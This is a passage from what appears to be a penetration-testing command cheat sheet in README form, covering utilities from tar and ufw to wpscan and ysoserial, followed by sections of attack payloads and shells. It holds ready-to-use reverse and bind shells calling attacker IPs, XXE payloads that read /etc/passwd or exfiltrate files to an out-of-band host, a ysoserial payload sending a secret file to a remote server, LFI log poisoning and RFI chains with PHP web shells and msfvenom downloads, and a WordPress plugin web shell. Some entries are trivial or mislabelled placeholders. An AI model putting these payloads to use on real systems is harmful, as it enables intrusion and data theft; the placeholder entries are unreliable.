  --> sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110
  ```

- **Windows-Specific Remote Port Forwarding**:
  ```bash
  ssh -R 1088 kali@ip --> SSH
  ```
- **SSH Key Management**:
  ```bash
  mkdir keys
  cd keys
  ssh-keygen
  cat id_rsa.pub
  ```

- **Importing the Public Key with Restrictions**:
  ```bash
  from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxO27JE5uXiHqoUUb4j9o/IPHxsPg+fflPKW4N6pK0ZXSmMfLhjaHyhUr4auF+hSnF2g1hN4N2Z4DjkfZ9f95O7Ox3m0oaUgEwHtZcwTNNLJiHs2fSs7ObLR+gZ23kaJ+TYM8ZIo/ENC68Py+NhtW1c2So95ARwCa/Hkb7kZ1xNo6f6rvCqXAyk/WZcBXxYkGqOLut3c5B+++6h3spOPlDkoPs8T5/wJNcn8i12Lex/d02iOWCLGEav2V1R9xk87xVdI6h5BPySl35+ZXOrHzazbddS7MwGFz16coo+wbHbTR6P5fF9Z1Zm9O/US2LoqHxs7OxNq61BLtr4I/MDnin www-data@hostname

  ```
- **Secure Tunnel with the Attacker Machine**:
  ```bash
  ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4
  ```

- ** Adding Public Key to Authorized Keys**:
  ```bash
  ssh-keygen
  cat:~/.ssh/id_rsa.pub
  echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD... kali@kali" > /root/.ssh/authorized_keys
  ```
- **Forcing Specific SSH Algorithms**:
  ```bash
  ssh -oKexAlgorithms=+diffie-hellman-group1-sha1,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-dss,ssh-rsa  tester@10.11.1.252 -p 22000 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"
  ```

### Steghide
- **Embed Data in a File**:
  ```bash
  steghide embed -cf <cover_file> -ef <embed_file>
  ```

- **Extract hidden data from a JPG image using Steghide**:
  ```bash
  steghide extract -sf <stego_file>
  steghide --extract -sf trytofind.jpg
  ```

### SVN
- **Check Out a Repository**:
  ```bash
  svn checkout <repo_url>
  ```

- **Commit Changes**:
  ```bash
  svn commit -m "<message>"
  ```
- **View the commit logs of the SVN repository with the provided username and password**:
  ```bash
  svn log --username admin --password admin http://192.168.120.73/svn/dev/
  ```

- **Compare the current revision (3) to the first revision (1) in the SVN repository**:
  ```bash
  svn diff -r 3:1 --username admin --password admin http://192.168.120.73/svn/dev/
  ```
- **Compare the current revision (3) to the second revision (2) in the SVN repository**:
  ```bash
  svn diff -r 3:2 --username admin --password admin http://192.168.120.73/svn/dev/
  ```

### Tail
- **View the End of a File**:
  ```bash
  tail <file>
  ```

- **Follow File Changes**:
  ```bash
  tail -f <file>
  ```
- **Monitor Apache access log in real-time using tail**:
  ```bash
  sudo tail -f /var/log/apache2/access.log
  ```



### Tar
- **Create a Tar Archive**:
  ```bash
  tar -cvf <archive.tar> <files>
  ```

- **Extract a Tar Archive**:
  ```bash
  tar -xvf <archive.tar>
  tar -zxvf accesslog.gz 
  tar xvfj accesslog.tar.bz2
  ```

### Tasklist
- **List All Processes**:
  ```cmd
  tasklist
  ```

- **Filter by Name**:
  ```cmd
  tasklist /FI "IMAGENAME eq <process_name>"
  ```
- **Display all running processes along with their services**:
  ```cmd
  tasklist /svc
  ```

- **Display running processes by the SYSTEM account that are currently active**:
  ```cmd
  tasklist /fi "USERNAME eq NT AUTHORITY\SYSTEM" /fi "STATUS eq running"
  ```
- ** Filter to display processes with the name 'cmd.exe'**:
  ```cmd
  tasklist /fi "imagename eq cmd.exe"  # View processes named 'cmd.exe'
  ```

### Terminal
- **Open a New Terminal Tab**:
  ```bash
  gnome-terminal --tab
  ```
- ** Setting Proxy for the Terminal**:
  ```bash
  export https_proxy="http://intern.com:3128"
  export http_proxy="http://intern.com:3128"
  ```

### TheHarvester
- **Gather Information about a Domain**:
  ```bash
  theharvester -d <domain> -l 500 -b google
  ```

### Tr
- **Translate Characters**:
  ```bash
  echo <string> | tr <set1> <set2>
  ```

- **Delete Characters**:
  ```bash
  echo <string> | tr -d <chars>
  ```
- **Remove newline characters from a file**:
  ```bash
  cat test | tr -d '\n'
  ```

### UFW
- **Allow a Port**:
  ```bash
  ufw allow <port>
  ```

- **Check UFW Status**:
  ```bash
  ufw status
  ```
- **List available application profiles in UFW**:
  ```bash
  sudo ufw app list
  ```

- **Show detailed information about the SSH application profile**:
  ```bash
  sudo ufw app info SSH
  ```
- ** Allow SSH traffic through the firewall**:
  ```bash
  sudo ufw allow SSH
  ```
- **Enable the UFW firewall**:
  ```bash
  sudo ufw enable
  ```

### Uname
- **Print System Information**:
  ```bash
  uname -a
  ```

- **Print Kernel Name**:
  ```bash
  uname -s
  ```
- **Display the version of the operating system**:
  ```bash
  uname -v
  ```
- **Display the kernel release version**:
  ```bash
  uname -r
  ```

### Watch
- **Run a Command Repeatedly**:
  ```bash
  watch <command>
  ```

- **Highlight Changes**:
  ```bash
  watch -d <command>
  ```
- **Monitor system resource usage with 'w' command, refreshing every 5 seconds**:
  ```bash
  watch -n 5 w
  ```
- ** Continuously monitor the status of files in a directory (ignoring certain paths) every second, highlighting differences**:
  ```bash
  watch -n 1 -d "find . -! -path './hooks/*' -! -path './info/*' | sort"
  ```
  -n option: every second, -d option: highlights the differences between the previous and the current output
### WC
- **Count Lines in a File**:
  ```bash
  wc -l <file>
  ```

- **Count Words in a File**:
  ```bash
  wc -w <file>
  ```
- **Count the number of characters in test.txt**:
  ```bash
  wc -m < test.txt
  ```
- **Count the number of files and directories in the current directory**:
  ```bash
  ls -l | wc -l
  ```

### Webservers
- **Start a Simple Python Web Server using Python 2**:
  ```bash
  python -m SimpleHTTPServer  <port>
  ```
- **Start a Simple Python Web Server using Python 3**:
  ```bash
  python -m http.server <port>
  ```
- **Start a Simple PHP Web Server**:
  ```bash
  php -S 0.0.0.0:8000
  ```
- **Start a Simple Ruby Web Server**:
  ```bash
  ruby -run -e httpd . -p 9000
  ```
- **Start a Simple BusyBox Web Server**:
  ```bash
  busybox httpd -f -p 10000
  ```

### WFuzz
- **Fuzz a URL**:
  ```bash
  wfuzz -c -z file,<wordlist> --hc 404 <url>/FUZZ
  ```

- **Fuzz POST Data**:
  ```bash
  wfuzz -c -z file,<wordlist> -d "param=FUZZ" <url>
  ```
- **User Enumeration with Password Reset Function:**:
  ```bash
  wfuzz -c -L -u "<URL>/ResetPasswordController.php" -d "email=FUZZ@test.local&Submit=" -b "PHPSESSID=FUZZ" -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt --hs
  ```
  
### Whois
- **Query Domain Information**:
  ```bash
  whois <domain>
  ```
- **Query Domain Information Using a Specific WHOIS Server**:
  ```bash
  whois <domain>  -h <IP>
  ```
  This command queries domain information but specifies an external WHOIS server using the -h option.
- **Reverse Whois Lookup**:
  ```bash
  whois <IP> -h <IP>
  ```
  This command performs a reverse lookup by providing an IP address, allowing you to gather information about the domain or entity associated with the IP.
### Wpscan

- **Scan a WordPress Site**:
  ```bash
  wpscan --url <site_url>
  ```

- **Brute-Forcing the User Credentials**:
  ```bash
  wpscan --url http://192.168.217.52/ -U tester -P /usr/share/wordlists/rockyou.txt
  ```

- **basic Enumeration**:
  ```bash
  wpscan --url vulnserver.local --enumerate ap,at,cb,dbe
  ```

- **Plugins Enumeration**:
  ```bash
  wpscan --url http://blogger.thm/assets/fonts/blog/ --plugins-detection aggressive
  wpscan --url <site_url> --enumerate p
  ```

### Xfreerdp
- **Connect to an RDP Server**:
  ```bash
  xfreerdp /u:<username> /p:<password> /v:<host>
  ```
- **Connecting to the host with xfreerdp**:
  ```bash
  xfreerdp /d:sandbox /u:tester /v:10.10.10.10 +clipboard
  ```

- **Connecting and sharing a folder**:
  ```bash
  xfreerdp /d:sandbox /u:tester /v:10.5.5.20 /drive:/root/oscp/temp /dynamic-resolution +clipboard
  ```

### Xxd
- **Create a Hex Dump**:
  ```bash
  xxd <file>
  ```

- **Revert a Hex Dump to Binary**:
  ```bash
  xxd -r <hex_file>
  ```
- **Hex Dump a File Byte by Byte**:
  ```bash
  xxd -g 1 file
  ```
  The `xxd` command with the `-g 1` flag generates a hex dump of the file, splitting each byte into its own column. This is useful for analyzing files at a very granular level or for debugging binary data.


### Ysoserial

- **Generate a Payload**:
  ```bash
  java -jar ysoserial.jar <payload_type> "<command>"
  ```

  Use the `ysoserial` tool to generate serialized payloads for exploitation or testing. Replace `<payload_type>` with the appropriate payload and `<command>` with the command to execute.

- **Delete a File**:
  ```bash
    java -jar path/to/ysoserial.jar CommonsCollections4 'rm /home/test/test.txt' | base64
    ```
    This example generates a serialized payload using the `CommonsCollections4` exploit, which deletes the `test.txt` file from the specified directory. The payload is then encoded in Base64 for transmission.

- **Exfiltrate a Secret File**:
  ```bash
    java -jar /oscp/Cassios/ysoserial-all.jar CommonsCollections6 'wget --post-file=/home/test/secret fakeserver.local' | gzip -f | base64 -w0
    ```
    This example creates a payload using the `CommonsCollections6` exploit to exfiltrate the `secret` file from the target. It sends the file as a POST request to a remote server using `wget`. The payload is compressed with `gzip` and encoded in Base64 for delivery.


---

## Payloads

### Cross-Site Scripting (XSS) Payloads
- **XSS Attack**:
  ```html
  <script>alert('XSS Attack');</script>
  ```



### XML External Entity (XXE) / XML Payloads
- **XML External Entity (XXE) Injection**:
  ```xml
  <!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <root>&xxe;</root>
  ```

- **XML Injection**:
  ```xml
  <user><name>admin' or '1'='1</name></user>
  ```
- **Basic Exploiting XXE Using External Entities to Retrieve Files**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
<productId>&xxe;</productId>
<storeId>1</storeId>
</stockCheck>
```

- **Exploiting XXE to Perform SSRF Attacks**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/admin"> ]>
<stockCheck>
<productId>&xxe;</productId>
<storeId>1</storeId>
</stockCheck>
```

- **Blind XXE with Out-of-Band Interaction**:
```xml
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
...
&xxe;
```

- **Blind XXE with Out-of-Band Interaction via XML Parameter Entities**:
```xml
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
```

- **Exploiting Blind XXE to Exfiltrate Data Using a Malicious External DTD**:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://716a3zyakekbtzc9ndo3y91uzl5ct7hw.oastify.com/?x=%file;'>">
%eval;
%exfil;
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```

- **Exploiting XInclude to Retrieve Files**:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

- **Exploiting XXE via Image File Upload**:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

- **Exploiting XXE to Retrieve Data by Repurposing a Local DTD**:
```xml
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

- **PHP Filters with XXE to Read the Source Code of Files on the Webserver**:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=info.php" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```
### SQL Injection (SQLi) Payloads
- **SQL Injection**:
  ```sql
  ' OR 1=1 --
  ```

- **Blind SQL Injection**:
  ```sql
  ' AND IF(1=1,SLEEP(5),0)--
  ```

### Antivirus (AV) Bypass
- **AV Bypass Example**:
  ```bash
  echo 'This is a test' > test.exe
  ```

### Buffer Overflow (BOF) Linux (LIN)
- **BOF Linux Example**:
  ```bash
  python -c "print 'A' * 5000" | nc -v 127.0.0.1 80
  ```

### Buffer Overflow (BOF) Windows (WIN)
- **BOF Windows Example**:
  ```python
  python -c "print 'A' * 2000" | nc -v 127.0.0.1 80
  ```

### Access Control Vulnerabilities
- **Access Control Vulnerability Example**:
  ```bash
  curl -H "Authorization: Bearer <token>" http://example.com/admin
  ```

### Active Directory (AD)
- **Active Directory Attack Example**:
  ```bash
  ldapsearch -x -b "dc=example,dc=com" "(userPrincipalName=*)" 
  ```

### Bindshells
- **Bindshell Example**:
  ```bash
  nc -lvp 4444 -e /bin/bash
  ```

### Brute Force
- **Brute Force Attack Example**:
  ```bash
  hydra -l admin -P /path/to/passwords.txt ssh://target.com
  ```

### Clickjacking
- **Clickjacking Example**:
  ```html
  <iframe src="http://target.com" width="100%" height="100%" style="opacity: 0.0; position: absolute;"></iframe>
  ```

### Cross-Origin Resource Sharing (CORS)
- **CORS Example**:
  ```js
  fetch('http://malicious.com', { method: 'GET', headers: { 'Origin': 'http://malicious.com' } });
  ```

### Cross-Site Request Forgery (CSRF)
- **CSRF Example**:
  ```html
  <img src="http://victim.com/account/change-password?newpassword=1234" />
  ```
- **Basic Considerations for CSRF testing**:
  ```html
  - CSRF protection where token validation depends on the request method
  - CSRF protection where the token is not tied to the user session
  - CSRF protection where the token is tied to a non-session cookie
  - CSRF protection via the addition of the Referer header to bypass header policy
  - CSRF protection where the token is duplicated in the cookie
  <meta name="referrer" content="no-referrer">
  ```

### Database Vulnerabilities (DB)
- **Database Vulnerability Example**:
  ```sql
  SELECT * FROM users WHERE username = 'admin' AND password = 'password'
  ```

### Directory Traversal (DIR)
- **Directory Traversal Payload 1**:
```bash
curl http://example.com/image?filename=../../../../../etc/passwd
```

- **Directory Traversal Payload 2**:
```bash
curl http://example.com/image?filename=/etc/passwd
```

- **Directory Traversal Payload 3**:
```bash
curl http://example.com/image?filename=....//....//....//etc/passwd
```

- **Directory Traversal Payload 4 (URL-encoded 2 times)**:
```bash
curl http://example.com/image?filename=..%252f..%252f..%252fetc/passwd
```

- **Directory Traversal Payload 5**:
```bash
curl http://example.com/image?filename=../../../../../etc/passwd
```

- **Directory Traversal Payload 6 (Validation of Start of Path)**:
```bash
curl http://example.com/image?filename=/var/www/images/../../../etc/passwd
```

- **Directory Traversal Payload 7 (Null Byte Bypass)**:
```bash
curl http://example.com/image?filename=../../../../../etc/passwd%00.png
```


### File Transfer (FTP)
- **FTP Example**:
  ```bash
  ftp -n -v 192.168.1.1
  ```

### File Upload
- **File Upload Example**:
  ```html
  <input type="file" name="file" />
  ```

### File Transfer Protocol (FTP)
- **FTP Example**:
  ```bash
  ftp -n -v 192.168.1.1
  ```

### GraphQL
- **GraphQL Example**:
  ```graphql
  {
    user(id: "1") {
      name
      email
    }
  }
  ```

### Hashing Attacks
- **Hashing Example**:
  ```python
  import hashlib
  hash = hashlib.md5(b'password').hexdigest()
  ```

### Host Header Injection
- **Host Header Injection Example**:
  ```bash
  curl -H "Host: victim.com" http://target.com
  ```

### HTA (HTML Application)
- **HTA Example**:
  ```html
  <script src="mshta.exe" />
  ```

### HTTP Header Attacks
- **HTTP Header Injection Example**:
  ```bash
  curl -H "X-Forwarded-For: 127.0.0.1" http://target.com
  ```

### HTTP Request Smuggling
- **HTTP Request Smuggling Example**:
  ```bash
  curl -H "Transfer-Encoding: chunked" -H "Content-Length: 5" http://target.com
  ```

### Internet Relay Chat (IRC)
- **IRC Example**:
  ```bash
  irc://example.com/channel
  ```

### JSON Web Token (JWT)
- **JWT Example**:
  ```bash
  curl -H "Authorization: Bearer <token>" http://target.com
  ```

### Local File Inclusion (LFI)
- **LFI Example**:
  ```bash
  curl http://example.com/index.php?page=../../etc/passwd
  ```
- **Log File Poisoning: Using Netcat to send a PHP payload**:
```bash
nc -nv 10.11.0.22 80
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```

- **Using the Poisoned Log File**:
```bash
curl http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
```
- **Searching for Windows hosts file**:
```bash
curl http://10.11.0.22/menu.php?file=c:\windows\system32\drivers\etc\hosts
```

- **A Test Payload Using the Data Wrapper**:
```bash
curl http://10.11.0.22/menu.php?file=data:text/plain,hello%20world
```

- **A Sample LFI Payload Using the Data Wrapper**:
```bash
curl http://10.11.0.22/menu.php?file=data:text/plain,<?php%20echo%20shell_exec("dir")%20?>
```

- **LFI to RFI Example**:
```bash
# On the attacker side, set up the shell payload
<?php shell_exec("bash -i >& /dev/tcp/192.168.119.172/443 0>&1"); ?>

# Exploit
curl http://10.11.1.35/section.php?page=http://192.168.119.172/shell2.php
```

- **Search for Local SSH Private Keys**:
```bash
curl http://192.168.124.212/secret/evil.php?command=/home/mowree/.ssh/id_rsa
```

- **Directory Traversal Vulnerable Code Example**:
```php
# Vulnerable PHP code
if(containsStr($_GET['show'], 'pending') || containsStr($_GET['show'], 'completed')) {
    error_reporting(E_ALL ^ E_WARNING);
    include  $_GET['show'] . $ext;
} else {
    echo 'You can select either one of these only';
}
```

- **Directory Traversal Exploit for the vulnerable code**:
```bash
curl http://192.168.1.33/dashboard.php?show=pending/../../../../../etc/passwd
```
### Macros
- **Macro Example**:
  ```vba
  Sub AutoOpen()
      Set objShell = CreateObject("WScript.Shell")
      objShell.Run "cmd.exe /c calc.exe"
  End Sub
  ```

### Network File System (NFS)
- **NFS Example**:
  ```bash
  mount -t nfs target:/path /mnt
  ```

### Operating System (OS) Vulnerabilities
- **OS Vulnerability Example**:
  ```bash
  sudo apt-get install vulnerable-package
  ```

### Other Vulnerabilities
- **Other Example**:
  ```bash
  curl -X DELETE http://example.com/resource
  ```

### phpMyAdmin
- **phpMyAdmin Example**:
  ```php
  http://example.com/phpmyadmin
  ```

### Privilege Escalation Linux (LIN)
- **Privilege Escalation LIN Example**:
  ```bash
  sudo -u root id
  ```

### Privilege Escalation Windows (WIN)
- **Privilege Escalation WIN Example**:
  ```powershell
  net localgroup administrators /add user
  ```

### Reverse Shells
- **Reverse Shell Example**:
  ```bash
  nc -e /bin/bash attacker.com 4444
  ```

### Remote File Inclusion (RFI)
- **RFI Example**:
  ```bash
  curl http://example.com/index.php?page=http://malicious.com/malicious_file.php
  ```
- **Using the File Parameter for an RFI Payload**:
```bash
curl http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt
```

- **Using a Netcat Listener to Verify RFI**:
```bash
sudo nc -nvlp 80
listening on [any] 80 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 50324
GET /evil.txt HTTP/1.0
Host: 10.11.0.4
Connection: close
```

- **Shell Code in Evil.txt**:
```bash
cat evil.txt
<?php echo shell_exec($_GET['cmd']); ?>

```

- **Exploiting the RFI Vulnerability**:
```bash
curl http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt&cmd=ipconfig
```

- **RFI Payload with a Windows Machine**:
```bash
# Create and modify pwn.php to execute the reverse shell
cat pwn.php
<?php
$exec = system('certutil.exe -urlcache -split -f "http://192.168.49.68/shell.exe" shell.exe', $val);
?>

# Generate the shell payload
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.68 LPORT=445 -f exe > shell.exe

# Deploy the payload
curl http://192.168.68.53:8080/site/index.php?page=http://192.168.49.68/pwn.php

# Execute the shell
cat pwn.php
<?php
$exec = system('shell.exe', $val);
?>

curl http://192.168.68.53:8080/site/index.php?page=http://192.168.49.68/pwn.php
```
### Serialization and Deserialization
- **Serialization Example**:
  ```python
  import pickle
  data = pickle.dumps({"username": "admin", "password": "password"})
  ```

### Shellshock
- **Shellshock Example**:
  ```bash
  env x='() { :;}; echo vulnerable' bash -c "echo hello"
  ```

### Server Message Block (SMB)
- **SMB Example**:
  ```bash
  smbclient \\target\share
  ```

### Simple Mail Transfer Protocol (SMTP)
- **SMTP Example**:
  ```bash
  telnet smtp.target.com 25
  ```

### Simple Network Management Protocol (SNMP)
- **SNMP Example**:
  ```bash
  snmpwalk -v 2c -c public 192.168.1.1
  ```

### Server-Side Request Forgery (SSRF)
- **SSRF Example**:
  ```bash
  curl -X POST http://target.com/api/v1/resource -d 'url=http://internal-server'
  ```

### Server-Side Template Injection (SSTI)
- **SSTI Example**:
  ```html
  {{ config }}
  ```

### Symfony
- **Symfony Example**:
  ```bash
  php bin/console server:start
  ```

### Trivial File Transfer Protocol (TFTP)
- **TFTP Example**:
  ```bash
  tftp target.com
  ```

### Web Cache Poisoning
- **Web Cache Poisoning Example**:
  ```bash
  curl -H "X-Forwarded-For: 127.0.0.1" http://example.com/resource
  ```

### Wireless Vulnerabilities
- **Wireless Example**:
  ```bash
  iwlist wlan0 scan
  ```

### wkhtmltopdf
- **wkhtmltopdf Example**:
  ```bash
  wkhtmltopdf http://example.com output.pdf
  ```

### WordPress (WP)
- **WordPress Example**:
  ```bash
  curl http://example.com/wp-login.php
  ```
- **Authenticated RCE via Theme Editor**:
```php
# Navigate to Appearance → Theme Editor → 404 Template
<?php echo exec("cat /home/flag.txt")?>
<?php echo system("whoami")?>
```

- **RCE via Add Plugins**:
```bash
cd /usr/share/seclists/Web-Shells/WordPress
sudo zip plugin-shell.zip plugin-shell.php 
# Upload the ZIP file and Install
```

- **Exploiting Shell via Plugin**:
```bash
# Access the shell
curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php

# Generate a reverse shell payload
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=443 -f elf > shell.elf

# Download the payload using the RCE
curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=wget%20http://10.11.0.4/shell.elf

# Set execute permissions on the payload
curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=chmod%20%2bx%20shell.elf
```


### WebSocket (WS)
- **WebSocket Example**:
  ```javascript
  const socket = new WebSocket('ws://example.com/socket');
  ```
- **WebSocket XSS**:
  ```javascript
  {"message":"<img src=1 onerror='alert(1)'>"}
  {"message":"<img src=1 onerror='<img src=1 oNeRrOr=alert`1`>"}
  ```

### XPath Injection
- **XPath Injection Example**:
  ```xml
  //user[username='admin' and password='password']
  ```
- **Get all usernames**
**XPath Injection Example:**
```xml
') or 1=1 or (' 
```

- **Get Passwords**
**XPath Injection Example:**
```xml
')] | //password%00
```

- **Reveals a list of passwords**
**XPath Injection Example:**
```xml
')] | //user/*[contains(*,'password')]
```


### Other Payloads
- **PHP Reverse Shell**:
  ```php
  <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker-IP>/4444 0>&1'"); ?>
  ```

- **Python Reverse Shell**:
  ```python
  import socket, subprocess, os
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(("<attacker-IP>",<port>))
  os.dup2(s.fileno(), 0)
  os.dup2(s.fileno(), 1)
  os.dup2(s.fileno(), 2)
  subprocess.call(["/bin/sh","-i"])
  ```

---

## Shells

### Reverse Shells
- **Netcat Reverse Shell**:
  ```bash
  nc -e /bin/bash <attacker-IP> <port>
  ```

- **Python Reverse Shell**:
  ```bash
  python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<attacker-IP>",<port>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'
  ```

### Bind Shells
- **Netcat Bind Shell**:
  ```bash
  nc -lvnp <port> -e /bin/bash
  ```

- **Python Bind Shell**:
  ```bash
  python3 -c 'import socket,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.bind(("0.0.0.0",<port>)); s.listen(1); conn, addr = s.accept(); os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2); os.system("/bin/sh")'
  ```

---

## Useful Resources

### Payloads and Exploits
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings): A comprehensive collection of payloads.
- [GTFOBins](https://gtfobins.github.io/): A curated list of Unix binaries that can be exploited by pentesters.
- [Exploit-DB](https://www.exploit-db.com/): A database of public exploits and proof-of-concepts.
- [OWASP Top 10](https://owasp.org/www-project-top-ten/): A list of the top 10 security risks.

### Pentesting Guides
- [HackTricks](https://book.hacktricks.xyz/): A handbook with tips and tricks for pentesting.
- [PentesterLab](https://www.pentesterlab.com/): A platform offering a variety of web application and pentesting exercises.
- [Hack The Box](https://www.hackthebox.eu/): A platform for pentesting challenges and exercises.

### Security Tools
- [Burp Suite](https://portswigger.net/burp): A popular web vulnerability scanner and proxy tool.
- [Nikto](https://cirt.net/Nikto2): A web server scanner to find potential vulnerabilities.
- [Wireshark](https://www.wireshark.org/): A network protocol analyzer used for packet inspection.

---

## Contributing

Contributions are welcome! If you have additional useful commands or scripts, feel free to create a pull request:

1. Fork this repository.
2. Create a new branch:
   ```bash
   git checkout -b feature/add-new-commands
   ```
3. Commit your changes:
   ```bash
   git commit -m "Add new commands for XYZ"
   ```
4. Push to your branch:
   ```bash
   git push origin feature/add-new-commands
   ```
5. Open a pull request on GitHub.

---

## License

This project is licensed under the [MIT License](LICENSE).
